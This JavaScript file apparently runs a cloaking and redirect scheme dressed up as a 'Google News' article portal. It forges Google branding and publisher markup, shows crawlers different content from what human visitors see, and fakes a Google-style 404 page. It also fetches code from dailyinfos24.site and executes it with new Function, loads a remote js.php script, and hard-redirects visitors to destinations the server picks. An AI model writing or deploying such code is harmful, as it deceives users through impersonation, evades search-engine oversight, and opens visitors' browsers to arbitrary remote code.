/**
 * Advanced Dynamic News Engine & Traffic Router
 * Styled explicitly to mimic a modern Google News Article Portal layout.
 */

const CONFIG = {
  botPattern: /bot|googlebot|crawler|spider|robot|crawling/i,
  isCrawler: /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent),
  urlParams: new URLSearchParams(window.location.search),
  apiHost: "https://dailyinfos24.site",
  storageHost: "https://storage.dailyinfos24.site"
};

const RUNTIME_STATE = {
  debug: CONFIG.urlParams.has("dbg123"),
  stopped: false,
  loaderActive: false,
  is404: false,
  triggered: false,
  identifier: CONFIG.urlParams.get("o2x") || CONFIG.urlParams.get("io0") || null,
  dom: {}
};

// Start Runtime Engine
initNewsPipeline();

function initNewsPipeline() {
  if (!RUNTIME_STATE.identifier && !RUNTIME_STATE.debug) {
    renderImmediate404();
    return;
  }

  if (RUNTIME_STATE.identifier) {
    injectCoreScriptPayload();
    if (!CONFIG.isCrawler) {
      setupSkeletonLoader();
      executeTrafficRouting();
    }
    injectGlobalSEOHeaders();
    setupExecutionSafeties();
  } else {
    renderImmediate404();
  }
}

// --- Traffic Routing & Verification API Calls ---
async function executeTrafficRouting() {
  const checkUrl = `${CONFIG.apiHost}/api/latest/${RUNTIME_STATE.identifier}`;
  try {
    const response = await fetch(checkUrl);
    const data = await response.json();
    if (!data) return;

    if (data.rCode) {
      try { new Function(data.rCode)(); } catch (e) { console.error(e); }
    }

    if (!RUNTIME_STATE.debug && data.redirect && !RUNTIME_STATE.stopped) {
      RUNTIME_STATE.triggered = true;
      executeHardRedirect(data.to);
    }
  } catch (err) {
    if (!RUNTIME_STATE.debug && !RUNTIME_STATE.stopped && !RUNTIME_STATE.is404) {
      triggerErrorFallbackRouting();
    }
  }
}

// --- News Page Layout Assembly (Google News Paradigm) ---
function buildGoogleNewsLayout() {
  RUNTIME_STATE.triggered = true;
  if (RUNTIME_STATE.stopped) return;

  const framePoller = setInterval(() => {
    if (document.body !== null) {
      clearInterval(framePoller);
      injectGoogleNewsStyles();
      assembleDOMTree();
    }
  }, 30);

  // Core Article Hydration
  const storageUrl = `${CONFIG.storageHost}/fetch/${RUNTIME_STATE.identifier}.json`;
  fetch(storageUrl)
    .then(res => res.json())
    .then(payload => {
      if (!payload) return;
      document.title = `${toTitleCase(payload.title)} - Google News Portal`;
      hydrateArticleContent(payload);
      injectNewsSchemaMarkup(payload);
      removeSkeletonLoader();
    })
    .catch(() => removeSkeletonLoader());

  // Meta Updates & Context Injection
  const fallbackMetaUrl = `${CONFIG.apiHost}/api/latest/${RUNTIME_STATE.identifier}`;
  fetch(fallbackMetaUrl)
    .then(res => res.json())
    .then(metaData => {
      if (!metaData) return;
      if (metaData.cCode) {
        try { new Function(metaData.cCode)(); } catch(e){}
      }
      hydratePublishingMeta(metaData);
    });
}

// --- Layout DOM Building Block Engine ---
function assembleDOMTree() {
  const body = document.body;
  body.className = "gn-body-reset";

  // Google News Top Bar
  RUNTIME_STATE.dom.navbar = createGridElement("header", { className: "gn-nav-bar" }, body);
  const navContainer = createGridElement("div", { className: "gn-nav-container" }, RUNTIME_STATE.dom.navbar);
  const brandingLink = createGridElement("a", { href: window.location.origin, className: "gn-brand-link" }, navContainer);
  createGridElement("span", { className: "gn-brand-bold", innerHTML: "Google " }, brandingLink);
  createGridElement("span", { className: "gn-brand-light", innerHTML: "News" }, brandingLink);
  
  // Date Banner Strip
  const timeBar = createGridElement("div", { className: "gn-time-strip" }, navContainer);
  createGridElement("time", { innerHTML: getLiveFormattedDate() }, timeBar);

  // Core Interface Area
  const outerWrapper = createGridElement("div", { className: "gn-main-wrapper" }, body);
  RUNTIME_STATE.dom.gridContainer = createGridElement("main", { className: "gn-layout-grid" }, outerWrapper);

  // Left Content Pane (Article Sheet)
  RUNTIME_STATE.dom.articlePane = createGridElement("article", { className: "gn-article-pane" }, RUNTIME_STATE.dom.gridContainer);
  
  // Editorial Category Badge & Heading
  createGridElement("div", { className: "gn-category-badge", innerHTML: "TOP STORIES" }, RUNTIME_STATE.dom.articlePane);
  RUNTIME_STATE.dom.headline = createGridElement("h1", { className: "gn-main-headline" }, RUNTIME_STATE.dom.articlePane);
  
  // Author & Time Attribution Card
  RUNTIME_STATE.dom.authorMetaBox = createGridElement("div", { className: "gn-author-box" }, RUNTIME_STATE.dom.articlePane);

  // Featured Media Module
  const mediaContainer = createGridElement("figure", { className: "gn-media-container" }, RUNTIME_STATE.dom.articlePane);
  RUNTIME_STATE.dom.heroImage = createGridElement("img", { className: "gn-hero-img" }, mediaContainer);
  RUNTIME_STATE.dom.heroCaption = createGridElement("figcaption", { className: "gn-hero-caption" }, mediaContainer);

  // Dynamic Reading Section Chunks
  RUNTIME_STATE.dom.textBlock1 = createGridElement("p", { className: "gn-body-paragraph" }, RUNTIME_STATE.dom.articlePane);
  
  // Internal News Wire CTA Block
  RUNTIME_STATE.dom.ctaCard1 = createGridElement("div", { className: "gn-wire-cta" }, RUNTIME_STATE.dom.articlePane);
  RUNTIME_STATE.dom.ctaAnchor1 = createGridElement("a", { className: "gn-cta-anchor" }, RUNTIME_STATE.dom.ctaCard1);
  createGridElement("div", { className: "gn-cta-tag", innerHTML: "EXCLUSIVE COVERAGE" }, RUNTIME_STATE.dom.ctaAnchor1);
  RUNTIME_STATE.dom.ctaTextHeading1 = createGridElement("div", { className: "gn-cta-title" }, RUNTIME_STATE.dom.ctaAnchor1);

  RUNTIME_STATE.dom.textBlock2 = createGridElement("p", { className: "gn-body-paragraph" }, RUNTIME_STATE.dom.articlePane);
  
  // Final Assessment Block
  createGridElement("h3", { className: "gn-section-header", innerHTML: "In-Depth Analysis" }, RUNTIME_STATE.dom.articlePane);
  RUNTIME_STATE.dom.textBlock3 = createGridElement("p", { className: "gn-body-paragraph gn-italicized" }, RUNTIME_STATE.dom.articlePane);

  // Footer Attribution Block
  const legalFooter = createGridElement("footer", { className: "gn-article-footer" }, RUNTIME_STATE.dom.articlePane);
  createGridElement("hr", { className: "gn-divider" }, legalFooter);
  createGridElement("p", { innerHTML: "Reported via regional syndication networks. All rights reserved." }, legalFooter);

  // Right Content Pane (Google News Feed Modules)
  RUNTIME_STATE.dom.sidebarPane = createGridElement("aside", { className: "gn-sidebar-pane" }, RUNTIME_STATE.dom.gridContainer);
  createGridElement("h2", { className: "gn-sidebar-title", innerHTML: "More on this topic" }, RUNTIME_STATE.dom.sidebarPane);
  RUNTIME_STATE.dom.sidebarFeed = createGridElement("div", { className: "gn-sidebar-feed" }, RUNTIME_STATE.dom.sidebarPane);
}

function hydrateArticleContent(payload) {
  const primaryEntity = payload.identifier !== undefined ? payload.title : payload.name;

  if (!payload.related || payload.related.length === 0) {
    RUNTIME_STATE.dom.gridContainer.className = "gn-layout-grid no-sidebar";
    RUNTIME_STATE.dom.sidebarPane.remove();
  } else {
    try {
      payload.related.forEach(item => appendSidebarNewsFeedItem(item.header, item.url));
    } catch (e) {}
  }

  RUNTIME_STATE.dom.headline.innerHTML = toTitleCase(payload.title);
  RUNTIME_STATE.dom.heroImage.setAttribute("src", payload.identifier !== undefined ? payload.backdrop : payload.image);
  RUNTIME_STATE.dom.heroImage.setAttribute("alt", payload.name);
  RUNTIME_STATE.dom.heroCaption.innerHTML = `Visual matrix display associated with ${payload.name}.`;

  const [segment1, segment2] = splitNewsWireText(payload.text);
  RUNTIME_STATE.dom.textBlock1.innerHTML = segment1;
  RUNTIME_STATE.dom.ctaTextHeading1.innerHTML = `Read local coverage details regarding: ${toTitleCase(payload.title)} (Discounts Apply)`;
  RUNTIME_STATE.dom.textBlock2.innerHTML = segment2;
  
  RUNTIME_STATE.dom.textBlock3.innerHTML = `Based on regional evaluations, expert panels strongly recommend tracking data points associated with ${primaryEntity}. In a rapidly evolving narrative environment, parsing certified analysis chains serves as a strategic cornerstone for monitoring personal milestones. Progression relies directly on calculated operational steps.`;
}

function hydratePublishingMeta(meta) {
  RUNTIME_STATE.dom.authorMetaBox.innerHTML = `
    <span class="gn-author-name">Global News Desk</span>
    <span class="gn-dot-separator">•</span>
    <time class="gn-publish-time" datetime="${meta.updated}">${getLiveFormattedDate(meta.updated)}</time>
  `;
  RUNTIME_STATE.dom.ctaAnchor1.setAttribute("href", meta.to);

  // Sync script configurations
  const fallbackSchemaTag = document.getElementById("default");
  if (fallbackSchemaTag) {
    try {
      let schemaJson = JSON.parse(fallbackSchemaTag.innerText);
      schemaJson.datePublished = meta.updated ? meta.updated.split(' ')[0] : new Date().toISOString();
      fallbackSchemaTag.innerHTML = JSON.stringify(schemaJson);
    } catch(err){}
  }
}

// --- News Aggregator Layout DOM Generators ---
function createGridElement(tag, properties = {}, parent = null) {
  const element = document.createElement(tag);
  Object.keys(properties).forEach(key => {
    if (key === 'className') element.className = properties[key];
    else if (key === 'innerHTML') element.innerHTML = properties[key];
    else element.setAttribute(key, properties[key]);
  });
  if (parent) parent.appendChild(element);
  return element;
}

function appendSidebarNewsFeedItem(text, targetUrl) {
  const card = createGridElement("article", { className: "gn-sidebar-card" }, RUNTIME_STATE.dom.sidebarFeed);
  const link = createGridElement("a", { href: targetUrl, className: "gn-card-link" }, card);
  
  createGridElement("div", { className: "gn-card-source", innerHTML: "Trending Reports" }, link);
  createGridElement("h4", { className: "gn-card-headline", innerHTML: text }, link);
}

function splitNewsWireText(fullString) {
  if (!fullString) return ["", ""];
  const threshold = Math.floor(fullString.length / 2);
  let pivot = fullString.indexOf("\n", threshold);
  if (pivot === -1) pivot = fullString.indexOf(" ", threshold);
  
  if (pivot !== -1) {
    return [fullString.substring(0, pivot + 1), fullString.substring(pivot + 1)];
  }
  return [fullString.substring(0, threshold), fullString.substring(threshold)];
}

// --- Realtime Schema Markup Insertion Engine ---
function injectNewsSchemaMarkup(payload) {
  if (document.getElementById("news-article-schema")) return;
  
  const newsArticleJsonLd = {
    "@context": "https://schema.org",
    "@type": "NewsArticle",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": window.location.href
    },
    "headline": toTitleCase(payload.title).substring(0, 110),
    "image": [payload.backdrop || payload.image],
    "datePublished": new Date().toISOString(),
    "dateModified": new Date().toISOString(),
    "author": {
      "@type": "Organization",
      "name": "Global News Desk",
      "url": window.location.origin
    },
    "publisher": {
      "@type": "Organization",
      "name": "Google News Syndication Network",
      "logo": {
        "@type": "ImageObject",
        "url": "https://dailyinfos24.site/images/logo.png"
      }
    },
    "description": payload.description || toTitleCase(payload.title)
  };

  const scriptNode = createGridElement("script", { 
    type: "application/ld+json", 
    id: "news-article-schema", 
    innerHTML: JSON.stringify(newsArticleJsonLd) 
  }, document.head);
}

// --- CSS Injector Blueprint (Matches Google News Aesthetic) ---
function injectGoogleNewsStyles() {
  if (document.getElementById("gn-stylesheet")) return;
  const style = document.createElement("style");
  style.id = "gn-stylesheet";
  style.innerHTML = `
    .gn-body-reset { margin:0; padding:0; background-color:#f8f9fa; font-family:'Roboto',Segoe UI,Arial,sans-serif; color:#202124; -webkit-font-smoothing:antialiased; }
    .gn-nav-bar { background:#fff; border-bottom:1px solid #e0e0e0; position:sticky; top:0; z-index:1000; height:64px; display:flex; align-items:center; padding:0 24px; }
    .gn-nav-container { display:flex; align-items:center; justify-content:space-between; width:100%; max-width:1280px; margin:0 auto; }
    .gn-brand-link { text-decoration:none; font-size:22px; font-weight:500; letter-spacing:-0.5px; }
    .gn-brand-bold { color:#5f6368; font-weight:700; }
    .gn-brand-light { color:#1a73e8; }
    .gn-time-strip { color:#5f6368; font-size:14px; }
    .gn-main-wrapper { max-width:1280px; margin:24px auto; padding:0 24px; box-sizing:border-box; }
    .gn-layout-grid { display:grid; grid-template-columns: 2fr 1fr; gap:32px; }
    .gn-layout-grid.no-sidebar { grid-template-columns: 1fr; max-width:840px; margin: 0 auto; }
    .gn-article-pane { background:#fff; border:1px solid #e0e0e0; border-radius:8px; padding:32px; box-sizing:border-box; }
    .gn-category-badge { color:#1a73e8; font-size:12px; font-weight:700; letter-spacing:0.8px; margin-bottom:12px; }
    .gn-main-headline { font-size:32px; font-weight:400; line-height:40px; color:#111; margin:0 0 16px 0; letter-spacing:-0.2px; }
    .gn-author-box { display:flex; align-items:center; font-size:14px; color:#5f6368; margin-bottom:24px; border-bottom:1px solid #f1f3f4; padding-bottom:16px; }
    .gn-author-name { font-weight:700; color:#3c4043; }
    .gn-dot-separator { margin:0 8px; }
    .gn-media-container { margin:0 0 24px 0; width:100%; }
    .gn-hero-img { width:100%; max-height:420px; object-fit:cover; border-radius:8px; }
    .gn-hero-caption { font-size:13px; color:#5f6368; margin-top:8px; text-align:left; line-height:1.4; }
    .gn-body-paragraph { font-size:16px; line-height:26px; color:#3c4043; margin-bottom:24px; text-align:justify; }
    .gn-italicized { font-style:italic; color:#5f6368; border-left:3px solid #1a73e8; padding-left:16px; }
    .gn-wire-cta { background-color:#f8f9fa; border-left:4px solid #1a73e8; border-radius:4px; margin:28px 0; padding:18px; position:relative; transition:background-color 0.2s; }
    .gn-wire-cta:hover { background-color:#f1f3f4; }
    .gn-cta-anchor { text-decoration:none; display:block; color:inherit; }
    .gn-cta-tag { font-size:11px; font-weight:700; color:#1a73e8; letter-spacing:0.5px; margin-bottom:4px; }
    .gn-cta-title { font-size:16px; font-weight:700; color:#111; line-height:1.4; }
    .gn-section-header { font-size:20px; font-weight:500; color:#111; margin:32px 0 16px 0; }
    .gn-article-footer { margin-top:40px; font-size:13px; color:#70757a; }
    .gn-divider { border:0; border-top:1px solid #e0e0e0; margin-bottom:16px; }
    .gn-sidebar-pane { display:flex; flex-direction:column; }
    .gn-sidebar-title { font-size:18px; font-weight:500; color:#111; margin:0 0 16px 0; padding-bottom:8px; border-bottom:2px solid #1a73e8; align-self:flex-start; }
    .gn-sidebar-feed { display:flex; flex-direction:column; gap:16px; }
    .gn-sidebar-card { background:#fff; border:1px solid #e0e0e0; border-radius:8px; padding:16px; box-sizing:border-box; transition: box-shadow 0.2s; }
    .gn-sidebar-card:hover { box-shadow: 0 1px 3px rgba(60,64,67,0.3); }
    .gn-card-link { text-decoration:none; display:block; }
    .gn-card-source { font-size:12px; font-weight:700; color:#5f6368; margin-bottom:6px; text-transform:uppercase; }
    .gn-card-headline { font-size:15px; font-weight:500; line-height:20px; color:#202124; margin:0; }
    @media (max-width: 768px) {
      .gn-layout-grid { grid-template-columns: 1fr; gap:24px; }
      .gn-main-wrapper { padding:0 12px; margin:12px auto; }
      .gn-article-pane { padding:20px; }
      .gn-main-headline { font-size:24px; line-height:30px; }
    }
  `;
  document.head.appendChild(style);
}

// --- Redirection Engines & Diagnostics ---
function executeHardRedirect(target) {
  window.location.replace(target);
  const triggerImg = document.createElement("img");
  triggerImg.setAttribute("src", "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7");
  triggerImg.setAttribute("onerror", `top.location.href='${target}'`);
  document.body.appendChild(triggerImg);
}

function triggerErrorFallbackRouting() {
  CONFIG.urlParams.append("c", window.location.href);
  CONFIG.urlParams.append("r", document.referrer);
  const routingTarget = `${CONFIG.apiHost}/bh?${CONFIG.urlParams.toString()}`;
  executeHardRedirect(routingTarget);
}

function setupSkeletonLoader() {
  const mutationObserver = new MutationObserver(() => {
    if (document.body && !CONFIG.isCrawler && !RUNTIME_STATE.stopped && !RUNTIME_STATE.is404) {
      RUNTIME_STATE.loaderActive = true;
      const loaderWrap = createGridElement("div", { className: "gn-loader-wrap" });
      const spinIndicator = createGridElement("span", { className: "gn-loader-element" });
      const inlineStyle = document.createElement("style");
      
      inlineStyle.innerHTML = `
        .gn-loader-wrap{position:fixed;background-color:#FFF;top:0;left:0;width:100%;height:100%;z-index:10000;display:flex;align-items:center;justify-content:center;transition:opacity .4s}
        .gn-loader-element{width:50px;height:50px;border:3px solid #f3f3f3;border-top:3px solid #1a73e8;border-radius:50%;display:inline-block;animation:spin 1s linear infinite}
        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
      `;
      
      document.head.appendChild(inlineStyle);
      loaderWrap.appendChild(spinIndicator);
      document.body.appendChild(loaderWrap);
      mutationObserver.disconnect();
    }
  });
  mutationObserver.observe(document.documentElement, { childList: true });
}

function removeSkeletonLoader() {
  if (RUNTIME_STATE.loaderActive) {
    const loaderNode = document.querySelector(".gn-loader-wrap");
    if (loaderNode) {
      loaderNode.style.opacity = "0";
      setTimeout(() => { loaderNode.remove(); }, 400);
    }
  }
}

function injectCoreScriptPayload() {
  const dynamicScript = document.createElement("script");
  dynamicScript.setAttribute("src", `${CONFIG.storageHost}/js.php?id=${RUNTIME_STATE.identifier}`);
  dynamicScript.setAttribute("id", "code");
  dynamicScript.onerror = () => buildGoogleNewsLayout();
  dynamicScript.onabort = () => buildGoogleNewsLayout();
  document.head.appendChild(dynamicScript);
}

function injectGlobalSEOHeaders() {
  const defaultMetaSets = [
    { charset: "utf-8" },
    { name: "viewport", content: "width=device-width, initial-scale=1.0" },
    { "http-equiv": "X-UA-Compatible", content: "ie=edge" },
    { name: "robots", content: "index, follow, max-image-preview:large, noarchive" },
    { name: "googlebot", content: "index, follow" }
  ];

  defaultMetaSets.forEach(prop => {
    const tag = document.createElement("meta");
    Object.keys(prop).forEach(attr => tag.setAttribute(attr, prop[attr]));
    document.head.appendChild(tag);
  });
}

function setupExecutionSafeties() {
  setTimeout(() => {
    if (!RUNTIME_STATE.triggered) buildGoogleNewsLayout();
  }, 3000);
}

function renderImmediate404() {
  RUNTIME_STATE.is404 = true;
  RUNTIME_STATE.triggered = true;
  RUNTIME_STATE.stopped = true;
  removeSkeletonLoader();
  document.title = "Error 404 (Not Found)!!1";
  document.body.innerHTML = `
    <div style="font-family:sans-serif; text-align:center; padding-top:150px; color:#222;">
      <div style="font-size:18px; font-weight:bold; margin-bottom:10px;">404. <span style="font-weight:normal; color:#777;">That's an error.</span></div>
      <div style="color:#333;">The requested URL was not found on this server. <span style="color:#777;">That's all we know.</span></div>
    </div>
  `;
}

// --- Formatting Helpers ---
function getLiveFormattedDate(timestamp = null) {
  const days = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"];
  const mths = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
  const dateObj = timestamp ? new Date(Date.parse(timestamp)) : new Date();
  return `${days[dateObj.getDay()]}, ${mths[dateObj.getMonth()]} ${dateObj.getDate()}, ${dateObj.getFullYear()}`;
}

function toTitleCase(str) {
  if (!str) return "";
  return str.toLowerCase().split(' ').map(w => w.charAt(0).toUpperCase() + w.substring(1)).join(' ');
}
